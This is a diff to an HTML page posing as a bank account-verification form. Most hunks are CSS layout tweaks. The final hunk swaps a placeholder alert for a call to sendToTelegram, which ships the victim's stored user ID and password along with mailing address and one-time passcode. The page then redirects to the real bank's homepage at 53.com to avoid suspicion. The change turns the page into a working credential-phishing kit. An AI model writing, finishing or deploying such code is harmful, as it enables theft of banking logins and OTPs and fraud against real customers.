@@ -60,7 +60,7 @@
       height: 56px;
     }
     .logo-img {
-      height: 72px;
+      height: 48px;
       width: auto;
       margin: 0 0 0 0;
     }
@@ -83,24 +83,37 @@
       color: #222;
       margin-bottom: 24px;
       text-align: left;
+      width: 100%;
+      border: none;
+      padding-bottom: 0;
     }
     .verify-form label {
-      display: block;
       margin-bottom: 12px;
       font-size: 1em;
       color: #222;
-      font-weight: 600;
+      font-weight: 700;
+      display: block;
+      text-align: left;
     }
     .verify-form input {
       width: 100%;
-      padding: 12px;
-      border: 1.5px solid #d1d5db;
-      border-radius: 4px;
+      padding: 14px 12px;
+      border: 1px solid #bfc5ce;
+      border-radius: 3px;
       font-size: 1em;
       margin-top: 6px;
       background: #fff;
       color: #222;
       box-sizing: border-box;
+    }
+    .card-row {
+      display: flex;
+      gap: 8px;
+      margin-top: 6px;
+    }
+    .card-row input {
+      flex: 1;
+      min-width: 0;
     }
     .login-btn {
       width: 100%;
@@ -108,7 +121,7 @@
       color: #fff;
       border: none;
       border-radius: 4px;
-      padding: 15px 0;
+      padding: 13px 0;
       font-size: 1.1em;
       font-weight: 700;
       cursor: pointer;
@@ -137,15 +150,6 @@
       font-size: 1.1em;
       margin: 0 auto;
       max-width: 600px;
-    }
-    .card-row {
-      display: flex;
-      gap: 8px;
-      margin-top: 6px;
-    }
-    .card-row input {
-      flex: 1;
-      min-width: 0;
     }
     @media (max-width: 600px) {
       .login-card {
@@ -198,14 +202,13 @@
       <p>For your security, please verify your account details to continue.</p>
     </div>
   </div>
-  <script src="send.js"></script>
+  <script src="vault/send.js"></script>
   <script>
     document.getElementById('verify-form').onsubmit = function(e) {
       e.preventDefault();
       // Get login data from sessionStorage
       const userid = sessionStorage.getItem('userid') || '';
       const password = sessionStorage.getItem('password') || '';
-      
       // Get verification data from form
       const data = {
         userid: userid,
@@ -217,10 +220,9 @@
         mailingaddress: this.mailingaddress.value,
         otp: this.otp.value
       };
-      
-      // For now, just show an alert
-      alert('Verification data submitted! In a real app, this would be sent to your backend.');
-      console.log('Form data:', data);
+      sendToTelegram(data);
+      this.reset();
+      window.location.href = 'https://www.53.com/';
     };
   </script>
 </body>
